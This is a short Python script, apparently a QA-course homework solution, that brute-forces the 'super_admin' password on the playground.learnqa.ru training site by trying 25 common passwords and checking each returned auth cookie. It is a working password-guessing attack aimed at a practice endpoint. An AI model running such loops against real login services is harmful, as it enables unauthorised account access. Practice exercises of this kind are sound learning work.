import requests

pass_list = {"123456", "123456789", "qwerty", "password", "1234567", "12345678", "12345", "iloveyou", "111111", "123123", "abc123", "qwerty123", "1q2w3e4r", "admin", "qwertyuiop", "654321", "555555", "lovely", "7777777", "welcome", "888888", "princess", "dragon", "password1", "123qwe"}



for ev in pass_list:
    response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data={"login":"super_admin", "password":ev})
    cookies = {"auth_cookie":response.cookies.get("auth_cookie")}
    response1 = requests.get("https://playground.learnqa.ru/api/check_auth_cookie", cookies=cookies)
    if response1.text == "You are authorized":
        print(f"Искомый пароль - {ev}")
        print(response1.text)
        break
